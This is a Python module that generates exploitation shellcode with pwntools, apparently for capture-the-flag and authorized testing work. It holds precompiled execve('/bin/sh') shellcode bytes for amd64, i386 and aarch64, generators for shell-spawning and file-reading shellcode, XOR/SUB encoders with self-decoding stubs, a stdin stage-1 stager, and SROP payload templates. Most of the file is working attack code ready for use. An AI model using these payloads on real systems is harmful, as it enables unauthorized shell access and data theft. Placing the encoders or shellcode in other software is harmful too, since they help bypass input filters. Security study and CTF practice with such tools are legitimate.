"""Shellcode generator (pwntools shellcraft).

Emits standard exploitation-primitive shellcode (execve /bin/sh, cat a file) for an
AUTHORIZED target / CTF, for the requested architecture. Reminds you that stack shellcode
needs NX disabled.

v2 adds:
  - encode_shellcode() — XOR/SUB/alphanumeric encoder with decoder stub generation
  - null_free_check()  — scan shellcode for null bytes, emit fix suggestions
  - gen_stager()       — read(0, buf, N) stage-1 loader (stage2 arrives on stdin)
  - gen_sigret_shellcode() — SROP frame + syscall gadget payload (pwntools or manual)
  - shellcode_help()   — quick reference
"""
from __future__ import annotations

import random
from typing import Dict, Optional

try:
    import os as _os
    _os.environ.setdefault('PWNLIB_NOTERM','1')
    from pwn import context, asm, shellcraft  # type: ignore
    from binoracle import _quiet_pwn as _qp; _qp()
    _HAVE_PWN = True
except Exception:
    _HAVE_PWN = False



# Well-known public execve("/bin/sh") shellcodes, used as a fallback when a cross-arch
# assembler is not available (e.g. pwntools 'as' missing on macOS).
_PRECOMPILED_SH = {
    "amd64": bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05"),
    "i386":  bytes.fromhex("31c050682f2f7368682f62696e89e3505389e131d2b00bcd80"),
    "aarch64": bytes.fromhex("420002ca6f0e8ed2ae0dadd270ee8ef2ee0e9df2010000ca01008fd2210c9fd2e103bfa9e0230091e803002be40300911f2003d5010000d4"),
}


def gen_shellcode(arch: str = "amd64", kind: str = "sh", arg: Optional[str] = None,
                  nx: Optional[bool] = None) -> str:
    if not _HAVE_PWN:
        return "pwntools not installed: pip install pwntools to enable shellcode generation."
    try:
        context.clear()
        context.arch = arch
        context.os = "linux"
    except Exception as e:
        return f"bad arch '{arch}': {e}"

    src = None
    blob = None
    try:
        if kind == "sh":
            src = shellcraft.sh()
        elif kind == "cat":
            src = shellcraft.cat(arg or "/etc/passwd")
        elif kind == "execve":
            src = shellcraft.execve(arg or "/bin/sh", 0, 0)
        else:
            return f"unknown kind '{kind}' (use sh|cat|execve)"
        blob = asm(src)
    except Exception as e:
        # fall back to a known-good precompiled execve('/bin/sh') if possible
        if kind in ("sh", "execve") and (arg in (None, "/bin/sh")) and arch in _PRECOMPILED_SH:
            blob = _PRECOMPILED_SH[arch]
            src = f"// precompiled execve('/bin/sh') for {arch} (no local assembler available)"
        else:
            return (f"shellcraft needs a cross-assembler not installed for arch={arch}. "
                    f"Install binutils for {arch}, or use kind=sh on amd64/i386/aarch64 "
                    f"(precompiled). Original error: {e}")

    hexs = blob.hex()
    out = [
        f"# shellcode: {kind}  arch={arch}  length={len(blob)} bytes",
        "# For an AUTHORIZED target / CTF. Stack execution requires NX disabled.",
    ]
    if nx:
        out.append("# NOTE: NX is ON on your target -> you cannot run this on the stack; "
                   "use ROP (ret2libc/ret2syscall) or an mprotect chain instead.")
    out.append("## bytes")
    out.append("```")
    out.append("shellcode = bytes.fromhex('" + hexs + "')")
    out.append("```")
    out.append("## pwntools")
    out.append("```python")
    out.append("from pwn import *")
    out.append(f"context.arch = {arch!r}")
    out.append(f"shellcode = asm(shellcraft.{kind}({repr(arg) if arg else ''}))")
    out.append("```")
    out.append("## disassembly source")
    out.append("```asm")
    out.append(src.strip())
    out.append("```")
    return "\n".join(out)


# ── Null-byte checker ─────────────────────────────────────────────────────────

def null_free_check(raw: bytes) -> Dict:
    """
    Scan `raw` shellcode for null bytes.
    Returns {"has_nulls": bool, "null_positions": [...], "suggestions": [...]}.
    For AUTHORIZED targets / CTF only.
    """
    null_positions = [i for i, b in enumerate(raw) if b == 0]
    suggestions = []
    if null_positions:
        suggestions = [
            "use 'xor rax, rax' instead of 'mov rax, 0' to zero a register",
            "use 'push 0x68732f2f; push 0x6e69622f; mov rdi, rsp' to avoid a null in /bin//sh address",
            "use 'xor edi, edi' instead of 'mov edi, 0' for 32-bit zero",
            "encode the shellcode with encode_shellcode(raw, method='xor') to eliminate nulls",
            "if the null is in a small immediate, try 'push N; pop rax' (N fits in 1 byte) instead of mov",
        ]
    return {
        "has_nulls": bool(null_positions),
        "null_positions": null_positions,
        "suggestions": suggestions,
    }


# ── Shellcode encoder ─────────────────────────────────────────────────────────

def encode_shellcode(raw: bytes, method: str = "xor", key: Optional[int] = None) -> str:
    """
    Encode `raw` shellcode and emit a full pwntools script with an inline decoder stub.

    method="xor"   — XOR each byte with `key` (random if not provided); decoder is
                     a short x86-64 XOR loop prepended to the payload.
    method="sub"   — SUB each byte by `key`; decoder uses ADD.
    method="alpha" — tries pwntools encode() for alphanumeric; falls back to a note.

    For AUTHORIZED targets / CTF only.
    """
    if method == "alpha":
        if _HAVE_PWN:
            try:
                from pwn import encode as _enc  # type: ignore
                encoded = _enc(raw, avoid=b"\x00")
                return (
                    "# Alphanumeric-encoded shellcode (pwntools encode)\n"
                    "# For an AUTHORIZED target / CTF.\n"
                    "from pwn import *\n"
                    f"encoded = {encoded!r}\n"
                    "# Send encoded directly; no decoder stub needed (alphanumeric is self-decoding).\n"
                    f"# Length: {len(encoded)} bytes\n"
                )
            except Exception as e:
                return (
                    f"# pwntools alpha encode failed: {e}\n"
                    "# Try method='xor' or method='sub' instead.\n"
                )
        return "# pwntools not installed; alpha encoding unavailable.\n"

    # XOR or SUB encoder
    if key is None:
        # pick a key that doesn't appear in the raw payload to avoid false decode
        candidates = [k for k in range(1, 256) if k not in raw]
        key = candidates[random.randint(0, len(candidates) - 1)] if candidates else random.randint(1, 255)

    key = key & 0xff
    if method == "xor":
        encoded = bytes(b ^ key for b in raw)
        op_encode = "XOR"
        op_decode_asm = f"xor byte [rsi], 0x{key:02x}"
    else:  # sub
        encoded = bytes((b - key) & 0xff for b in raw)
        op_encode = "SUB"
        op_decode_asm = f"add byte [rsi], 0x{key:02x}"

    # Null check on encoded payload
    null_in_encoded = [i for i, b in enumerate(encoded) if b == 0]
    null_warn = ""
    if null_in_encoded:
        null_warn = (
            f"# WARNING: encoded payload still has null bytes at positions {null_in_encoded[:8]}.\n"
            f"# Try a different key (current key=0x{key:02x}) or use method='xor' with a better key.\n"
        )

    # x86-64 decoder stub (self-modifying XOR/ADD loop)
    # Layout: [decoder_stub][encoded_payload]
    # The stub uses a relative call to find its own address (call/pop trick).
    decoder_asm = f"""\
    ; {op_encode} decoder stub (x86-64) — key=0x{key:02x}
    ; For AUTHORIZED targets / CTF only.
    jmp short _get_addr
_decode_loop:
    pop rsi                 ; rsi = &encoded[0]
    mov ecx, {len(encoded)}         ; loop counter
_loop:
    {op_decode_asm}
    inc rsi
    loop _loop
    jmp short _get_addr+5   ; jump to decoded shellcode
_get_addr:
    call _decode_loop
_encoded:
    ; encoded payload follows
"""

    lines = [
        f"# {op_encode} encoder — key=0x{key:02x}  arch=amd64  original={len(raw)}B  encoded={len(encoded)}B",
        "# For an AUTHORIZED target / CTF.",
        null_warn.rstrip(),
        "from pwn import *",
        "context.arch = 'amd64'",
        "",
        f"KEY = 0x{key:02x}",
        f"encoded_payload = bytes.fromhex({encoded.hex()!r})",
        "",
        "# Decoder stub — prepend this before the encoded payload.",
        "# The stub decodes in-place then jumps to the shellcode.",
        "decoder_stub = asm('''",
        decoder_asm.rstrip(),
        "''')",
        "",
        "payload = decoder_stub + encoded_payload",
        f"# Total length: len(decoder_stub) + {len(encoded)} bytes",
        "",
        "# Verify (optional — requires writable+executable mapping):",
        "# p = process('/your/target')",
        "# p.send(payload)",
    ]
    return "\n".join(line for line in lines if line is not None)


# ── Stager ────────────────────────────────────────────────────────────────────

def gen_stager(arch: str = "amd64", stage2_url: str = "",
               stage2_len: int = 4096) -> str:
    """
    Generate a pwntools stage-1 stager that calls read(0, buf, stage2_len) to
    receive and execute a second-stage shellcode from stdin.

    stage2_url is a comment only — the stager never makes network calls.
    For AUTHORIZED targets / CTF only.
    """
    url_comment = f"# stage2 source: {stage2_url}" if stage2_url else "# stage2 arrives on stdin"

    if _HAVE_PWN:
        try:
            context.clear()
            context.arch = arch
            context.os = "linux"
            # read(0, rsp-stage2_len, stage2_len); jmp rsp
            stager_src = shellcraft.read(0, "rsp", stage2_len) + shellcraft.jmp("rsp")
            blob = asm(stager_src)
            blob_hex = blob.hex()
            stager_section = (
                f"stager = asm(shellcraft.read(0, 'rsp', {stage2_len}) + shellcraft.jmp('rsp'))"
            )
        except Exception:
            blob_hex = None
            stager_section = (
                "# pwntools assembler unavailable for this arch; build manually:\n"
                f"# read(0, rsp, {stage2_len}); jmp rsp\n"
                "stager = b''  # TODO: replace with assembled stager bytes"
            )
    else:
        blob_hex = None
        stager_section = (
            "# pwntools not installed; assemble manually:\n"
            f"# read(0, rsp, {stage2_len}); jmp rsp  (arch={arch})\n"
            "stager = b''  # TODO: replace with assembled stager bytes"
        )

    lines = [
        f"# stage-1 stager — arch={arch}  stage2_len={stage2_len}",
        "# For an AUTHORIZED target / CTF only.",
        url_comment,
        "from pwn import *",
        f"context.arch = {arch!r}",
        "",
        stager_section,
    ]
    if blob_hex:
        lines += [
            f"# assembled ({len(bytes.fromhex(blob_hex))} bytes):",
            f"# stager = bytes.fromhex({blob_hex!r})",
        ]
    lines += [
        "",
        "# Usage:",
        "# io = process('/your/target')  # or remote('host', port)",
        "# io.send(stager)               # trigger the overflow / write primitive",
        "# io.send(stage2_shellcode)     # send your stage2 on stdin",
        "# io.interactive()",
    ]
    return "\n".join(lines)


# ── SROP / sigreturn shellcode ────────────────────────────────────────────────

def gen_sigret_shellcode(arch: str = "amd64") -> str:
    """
    Generate a SROP (Sigreturn-Oriented Programming) frame + syscall gadget payload.

    Uses pwntools SigreturnFrame if available, otherwise emits the manual struct layout
    and field offsets for amd64 / i386.
    For AUTHORIZED targets / CTF only.
    """
    if arch not in ("amd64", "i386"):
        return f"# SROP: only amd64 and i386 supported (got {arch!r})\n"

    if _HAVE_PWN:
        try:
            from pwn import SigreturnFrame, constants  # type: ignore
            context.clear()
            context.arch = arch
            context.os = "linux"
            frame = SigreturnFrame()
            # Set up execve("/bin/sh", NULL, NULL)
            if arch == "amd64":
                frame.rax = constants.SYS_execve    # 59
                frame.rdi = 0xdeadbeef              # placeholder: &"/bin/sh"
                frame.rsi = 0
                frame.rdx = 0
                frame.rip = 0xdeadbeef              # placeholder: syscall gadget
                frame.rsp = 0xdeadbeef              # placeholder: writable stack
            else:
                frame.eax = constants.SYS_execve    # 11
                frame.ebx = 0xdeadbeef
                frame.ecx = 0
                frame.edx = 0
                frame.eip = 0xdeadbeef
            frame_bytes = bytes(frame)
            lines = [
                f"# SROP payload — arch={arch}  (pwntools SigreturnFrame)",
                "# For an AUTHORIZED target / CTF only.",
                "# Requires: a 'syscall ; ret' gadget and control of rax=15 (sigreturn).",
                "from pwn import *",
                f"context.arch = {arch!r}",
                "",
                "# 1. Find: syscall_ret_gadget = <addr of 'syscall ; ret' in binary/libc>",
                "# 2. Find: binsh_addr         = <addr of '/bin/sh' string in memory>",
                "# 3. Find: writable_stack      = <writable area for fake stack>",
                "",
                "frame = SigreturnFrame()",
            ]
            if arch == "amd64":
                lines += [
                    "frame.rax = constants.SYS_execve   # 59",
                    "frame.rdi = binsh_addr             # &'/bin/sh'",
                    "frame.rsi = 0",
                    "frame.rdx = 0",
                    "frame.rip = syscall_ret_gadget",
                    "frame.rsp = writable_stack",
                ]
            else:
                lines += [
                    "frame.eax = constants.SYS_execve   # 11",
                    "frame.ebx = binsh_addr",
                    "frame.ecx = 0",
                    "frame.edx = 0",
                    "frame.eip = syscall_ret_gadget",
                ]
            lines += [
                "",
                "# Trigger: send [pop_rax_ret][15][syscall_ret][frame_bytes]",
                "# rax must equal 15 (SYS_rt_sigreturn) when 'syscall' executes.",
                "payload  = p64(pop_rax_ret)        # gadget: pop rax ; ret",
                "payload += p64(15)                 # SYS_rt_sigreturn",
                "payload += p64(syscall_ret_gadget) # 'syscall ; ret'",
                "payload += bytes(frame)",
                "",
                f"# Frame bytes ({len(frame_bytes)}B):",
                f"# bytes.fromhex({frame_bytes.hex()!r})",
            ]
            return "\n".join(lines)
        except Exception:
            pass  # fall through to manual

    # Manual layout
    if arch == "amd64":
        layout = """\
# amd64 ucontext / sigcontext field offsets (kernel ABI):
#   +0x28  rax   +0x30  rbx   +0x38  rcx   +0x40  rdx
#   +0x48  rsi   +0x50  rdi   +0x58  rbp   +0x60  rsp
#   +0x68  r8 .. +0xa0  r15
#   +0xa8  rip   +0xb0  eflags
# Total frame size: 0xf8 bytes
#
# Manual frame for execve('/bin/sh', 0, 0):
#   rax=59, rdi=&binsh, rsi=0, rdx=0, rip=syscall_gadget
import struct
frame  = b'\\x00' * 0x28          # padding to rax offset
frame += struct.pack('<Q', 59)    # rax = SYS_execve
frame += b'\\x00' * 8             # rbx
frame += b'\\x00' * 8             # rcx
frame += b'\\x00' * 8             # rdx (NULL)
frame += b'\\x00' * 8             # rsi (NULL)
frame += struct.pack('<Q', 0xdeadbeef)  # rdi = &'/bin/sh'
frame += b'\\x00' * 0x50          # rbp..r15 (zero)
frame += struct.pack('<Q', 0xdeadbeef)  # rip = syscall gadget
frame  = frame.ljust(0xf8, b'\\x00')"""
    else:
        layout = """\
# i386 sigcontext offsets (kernel ABI):
#   +0x00  gs   +0x04  fs  ... +0x1c  eax  +0x20  ecx
#   +0x24  edx  +0x28  ebx  +0x2c  esp  +0x30  ebp
#   +0x34  esi  +0x38  edi  +0x3c  eip  +0x40  eflags
# Manual frame for execve('/bin/sh', 0, 0):
#   eax=11, ebx=&binsh, ecx=0, edx=0, eip=int80_gadget
import struct
frame  = b'\\x00' * 0x1c          # padding to eax offset
frame += struct.pack('<I', 11)    # eax = SYS_execve
frame += b'\\x00' * 4             # ecx (NULL)
frame += b'\\x00' * 4             # edx (NULL)
frame += struct.pack('<I', 0xdeadbeef)  # ebx = &'/bin/sh'
frame += b'\\x00' * 0x0c          # esp, ebp, esi, edi
frame += struct.pack('<I', 0xdeadbeef)  # eip = int 0x80 gadget
frame  = frame.ljust(0x80, b'\\x00')"""

    return (
        f"# SROP manual frame — arch={arch}\n"
        "# For an AUTHORIZED target / CTF only.\n"
        "# pwntools not available; use the manual layout below.\n\n"
        + layout
    )


# ── Help / quick reference ────────────────────────────────────────────────────

def shellcode_help() -> str:
    """Quick reference for all shellcode helpers in this module."""
    return """\
## binoracle shellcode quick reference
### gen_shellcode(arch, kind, arg, nx)
  arch:  amd64 (default) | i386 | aarch64 | arm | mips | ...
  kind:  sh (default) | cat | execve
  arg:   path for cat/execve (default /etc/passwd or /bin/sh)
  nx:    True to emit a warning that NX is active

### encode_shellcode(raw, method, key)
  method:  xor (default) | sub | alpha
  key:     integer 0-255; random if omitted
  Returns: pwntools script with decoder stub prepended

### null_free_check(raw)
  Returns: {"has_nulls": bool, "null_positions": [...], "suggestions": [...]}

### gen_stager(arch, stage2_url, stage2_len)
  arch:        amd64 (default) | i386
  stage2_url:  comment only (never network)
  stage2_len:  bytes to read for stage2 (default 4096)
  Returns: pwntools stager script using read(0, rsp, N); jmp rsp

### gen_sigret_shellcode(arch)
  arch: amd64 (default) | i386
  Returns: pwntools SigreturnFrame script (or manual layout if pwntools absent)
  Requires: 'syscall ; ret' gadget, pop rax ; ret, control of rax=15

### Examples
  shellcode = gen_shellcode("amd64", "sh")
  encoded   = encode_shellcode(bytes.fromhex("4831..."), method="xor")
  check     = null_free_check(raw_bytes)
  stager    = gen_stager("amd64", stage2_len=1024)
  srop      = gen_sigret_shellcode("amd64")
"""
